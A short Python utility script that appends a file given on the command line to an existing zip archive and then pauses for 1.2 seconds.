#!/usr/bin/python
import zipfile 
import sys
import time
z = zipfile.ZipFile(sys.argv[1], "a")
z.write(sys.argv[2])
z.close()
time.sleep(1.2)